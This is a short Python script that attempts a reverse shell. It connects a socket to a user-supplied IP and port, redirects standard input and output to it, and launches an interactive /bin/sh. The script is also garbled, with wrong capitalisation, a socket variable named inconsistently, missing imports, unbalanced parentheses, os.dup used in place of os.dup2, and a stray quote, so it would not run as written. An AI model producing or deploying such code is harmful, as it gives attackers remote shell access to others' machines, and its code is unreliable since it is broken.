#!/usr/bin/python3

import socket
L=socket.socket(SOCKET.AF_INET SOCKET.SOCK_STREAM)
s.connect((input("enter the ip adress",input("enter the port you want to use"));
os.dup2(s.fileno(),0);
os.dup2(s.fileno(),1);
os.dup(s.fileno(),2);
p=subprocess.call(["/bin/sh","-i"]);'
